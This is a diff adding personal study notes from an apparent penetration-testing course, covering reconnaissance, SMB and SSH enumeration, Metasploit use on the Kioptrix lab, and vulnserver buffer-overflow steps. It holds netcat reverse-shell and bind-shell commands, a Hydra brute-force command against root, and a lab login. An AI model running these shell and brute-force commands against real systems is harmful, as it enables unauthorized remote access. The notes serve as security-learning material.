@@ -1,0 +1,374 @@
+--------------------------------OSINT---------------------------
+
+Hunting subdomains(tool sublist3r)
+syntax: sublist3r -d domain name -p port number(port number is optional)
+website:crt.sh
+best tool:OWASP amass
+
+
+Idenifying technologies
+website:buildwith
+find vulneribility in the technologies used
+built in tool:whatweb
+
+
+Gathering information with burp suite:it is a web proxy means it can intercept traffic
+
+
+Googling(Maybe chatgpt now xD)
+Google search syntax
+
+Utilizing soacial media
+
+----------------------------Kioptrix-------------------------
+
+
+kioptrix:username:john
+password:TwoCows2
+
+
+---------------------------------Scanning and Enumeration-------------------
+nmap -T4 -p- -A
+nmap -T4(1 is slowest, 5 is fastest)
+-p-(scan all ports
+-A everything
+
+------------------------Enumerating HTTP/HTTPS-------------------------
+
+80/443: 192.168.29.71(default web page)(apache)
+80: 192.168.29.40
+
+
+------------tool:nikto----------vulnerability scanner--------------------
+nikto -h http://192.168.29.71(-h means host)
+
+mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756. (192.168.29.71)
+
+*******directory buster tool:dirbuster, dirb,gobuster*****************
+
+open dirbuster:cmd :disbuster&******************************
+go faster in threads
+remember to put port number
+click browse->usr->share->wordlists->dirbuster and thenselect any wordlist
+these wordlist contain well known directories like /admin or /home etc
+its going to try directories with file extension like /admin.txt or /admin.php
+
+kioptrix: Information disclosure
+got the following from burp suite
+Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b(Take Screenshot for proof of information disclosure)
+
+http://192.168.29.71/usage/ from dirbuster)
+
+-------------------Enumarating SMP(port 139)-----------------------
+SMB is fileshare
+
+---------------Metasploit----------
+Exploitation framwork
+open it using: msfconsole (cmd)
+cmd: search smb***************************
+results: first part is the type of module
+second part is the type of service  like DOS or fuzzer
+after typing cmd:search smb*********************
+auxiliary/scanner/smb/smb_version:number 105
+then to use that module type: use module_name/module_number**************
+eg: use auxiliary/scanner/smb/smb_version*****************
+after the use cmd: type info to get info about the module
+so cmd is :info********
+to check options, cmd is:options******************
+RHOSTS: remote host/target host is victim
+LHOST:local host
+RHOSTS:can use CIDR for multiple victims
+
+cmd: set RHOSTS 192.168.29.71 (to set the value of RHOST)************
+to run:run(is cmd)***************
+
+info gathered: Unix (Samba 2.2.1a)---------got form metasploit
+
+*******tool: smbclient:used to attempt to try to connect to fileshare out there with anonymouse access**********************
+
+cmd:smbclient -L \\\\target_ip\\ (-L to list files) (can also do \\ instead of \\\\ and if using \\ then no \\ at the end)********************
+
+smbclient \\\\target_ip\\Sharename(sharename is the fileshares we got) (eg in kioptrix is ADMIN$ but we dont know its password, \\IPC$ works in kioptrix without the need of a password)*************************
+
+
+---------------------------Enumerating SSH------------------------
+in kioptrix
+SSH: OpenSSH 2.9p2 (protocol 1.99)
+
+cmd:ssh 192.168.29.71***********(this dosent work but provides some offers) *******
+
+new cmd: ssh 192.168.29.71 -oKexAlgorithms=+offers_provided(still does not work)*****
+
+next cmd:ssh 192.168.29.71 -oKexAlgorithms=+offers_provided -c cipher_offer *********
+
+-------gobuster tool------
+Scan a website (-u http://192.168.0.155/) for directories using a wordlist (-w /usr/share/wordlists/dirb/common.txt) and print the full URLs of discovered paths (-e):
+
+cmd:gobuster dir -e -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt
+------------------------
+
+----------------Identifying and Researching Potential Vulnerabilities---------------
+mod_ssl 2.8.4 exploit(got from nikto)
+got the following info by searching for mod_ssl 2.8.4 exploit which we got from nikto
+80/443:potentially vulnerable to https://www.exploit-db.com/exploits/764
+and https://github.com/heltonWernik/OpenLuck
+
+apache 1.3.20 exploit(got from burp suite)
+
+
+-------in cve details website, red means critical vulnerability-------------
+
+Unix (Samba 2.2.1a)---------got form metasploit-------
+Description found on rapid 7:
+This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC. 
+
+139:when we used smbclient \\\\192.168.29.71\\IPC we got the access without password
+read more about the exploit on:https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/
+more on remote buffer overflow:https://www.exploit-db.com/exploits/7
+more on RCE:https://www.exploit-db.com/exploits/10
+
+--------------tool:searchsploit--------------
+
+cmd:searchsploit Samba 2.2.1a***************
+----tip:dont search for exact version cause then searchsploit searches for exact string
+eg: search for:cmd: searchsploit Samba**************
+
+
+---------------tool:Nessus: Vulnerability scans with Nessus--------------------
+
+to start nessus:/bin/systemctl start nessusd.service*************
+thrn go to: https://kali:8834/
+
+-----------------------Exploitation---------------
+shell:a shell is a program that provides a command-line interface (CLI) for interacting with the operating system. The shell interprets user commands and executes them on behalf of the user.
+
+shell:connect to the target
+reverse shell:target connecting to us
+
+-----tool netcat------
+cmd: nc -lvp 4444
+-l:listening
+-v:verbose
+-p:on port 4444
+so listening on port 4444 and will return verbose info
+
+bind shell:we open a port on target then connect to it(we connect to the target)
+------
+for reverse shell:
+on attacker side:
+nc -nvlp 4444
+
+on victim:
+nc attacker_ip 44444 -e /bin/bash
+means offering bash shell to he one we are connecting
+4444: is the port
+----
+for bind shell
+on victim: nc -nvlp 4444 -e /bin/bash
+on attacker: nc victim_ip
+
+------------Payloads---------Staged vs Non Staged-------
+
+payload:a payload is a piece of code or software that is used to exploit a vulnerability in a system. 
+
+
+Non staged: sends exploit shell code all at once
+large in size
+eg:meterpreter_reverse_tcp
+
+Staged:sends payload in stages
+can be less stable
+meterpreter/reverse_tcp
+
+------------------Samba 2.2 vulnerability---------------
+searchsploit samba 2.2
+we see: trans2open
+
+
+-----------open metasploit--------------
+search: trans2open
+
+choose option with linux
+cmd : use 1(1 is the option that has linx x86)****************
+cmd : options**********************
+
+cmd:set rhosts kiptrix_ip
+
+-----changed payload to non staged-------
+cmd: set payload linux/x86/payload name
+cmd: press tab twice to get options of payloads
+
+
+--------------manual exploitation--------------------
+use openLuck
+read on github how to use it
+
+---------------Brute Force Attacks---------------
+
+----tool:hydra--------
+
+cmd: hydra -l root -P /usr/share/wordlistsmetasploit/unix_passwords.txt ssh://192.168.29.71 -t 4 -V                            ********************
+-l:to attack root
+-P: password list
+-t: 4 threads
+-V:verbosity
+
+--------------Credential Stuffing---------------
+leaked credentials
+--------tool:foxy proxy(in firefox)--------
+
+----------------Buffer Overflow-------------------  
+in memory:
+top-> bottom
+kernel
+stack
+heap
+data
+text
+
+
+stack: top->bottom
+
+ESP(Extended Stack Pointer):register containing address of top of the stack
+Buffer space:goes(grows) downward
+EBP(Extended base pointer):register containing address of bottom of stack frame
+EIP(Extended Instruction Pointer)/ Return Address:register containing address of instruction to be excuted
+
+normal case:if we send bunch of characters in buffer they should stop at the bottom of buffer space
+
+
+in case of buffer overflow attack-----
+overflow the buffer space then reach EBP and then overflow it as well and reach EIP
+
+EIP:helps us to point to certain parts of memory to execute reverse shell
+
+-------------Steps to conduct buffer overflow-----------
+
+1)Spiking: finding vulnerable part of the program
+2)Fuzzing:Send bunch of characters to break the program
+3)Finding offset:Point where we break the program
+4)Overwriting the EIP using the offset
+5)Finding bad characters
+6)Finding right module
+7)Generating shell code
+8)Root
+
+----------------------------------------------
+By default vulnserver runs on port 9999
+
+------------------------Spiking---------------------
+
+first connect to windows vulnserver via nc
+cmd: nc -nv 192.168.29.230 9999(default port of vulnserver is 9999)
+
+cmd: generic_send_tcp(to know its usage)
+
+cmd: generic_send_tcp 192.168.29.230 9999 stats.spk 0 0
+
+generic_send_tcp 192.168.29.230 9999 trun.spk 0 0
+the above command pauses the immunity debugger means it crashed the vulnserver
+
+in Immunity debugger:in  EBP register we have 41414141 which is hex for AAAA
+
+we also have string of AAA in ESP and 
+41414141 in EIP
+
+sending characters to multiple commands to break them
+------------------Fuzzing---------------------
+
+sending characters to single commands to break it
+
+-------we found trun cmd broken------
+
+--------after crashing vulnserver :restart it and also immunity----------
+
+./1.py:keep checking immunity, when it pauses, ctrl+c the script running and note down the bytes it crashed at
+
+crash happens at around 2100 bytes:although we didnt overwrite  ESP EBP EIP
+next need to find where EIP is at
+controlling EIP is important
+
+------------------Finding the Offset-----------------------
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+
+-l:length 3000: crash happened round off to 3000 bytes
+
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
+-q:finding that we got from EIP in immunity
+
+response=Exact match at offset 2003
+
+---------------Overwriting EIP---------------------
+
+2003 bytes before we get to  the EIP
+EIP itself is 4 bytes long
+
+-------------Finding Bad Characters--------------
+
+find the cahracters out of pattern in hex dump of immunity
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
